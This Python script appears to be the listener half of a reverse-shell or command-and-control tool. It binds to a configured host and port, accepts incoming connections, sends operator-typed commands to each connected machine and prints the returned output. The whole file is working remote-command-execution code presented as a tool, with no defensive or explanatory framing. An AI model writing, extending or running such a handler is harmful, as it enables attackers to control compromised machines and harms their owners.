import socket
from src import ConfLoad
from src import Banner

Host,Port = ConfLoad.LoadConfigFile()
Banner.PrintBanerRc()

def main():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as stream:
        stream.bind((Host, Port))
        stream.listen()
        while True:
            print("\n [+] Listening For Connection .....")
            connection, address = stream.accept()
            with connection:
                print(f"\n[*] New Connection Received from {address}")
                command = input(f"[{address}] >>")
                command = command + "\n"
                commandRequest = command.encode()
                connection.sendall(commandRequest)
                commandOutput = connection.recv(1026)
                print(f"Command Output from {address}:")
                print(commandOutput.decode().strip())  


if __name__ == "__main__":
    main()
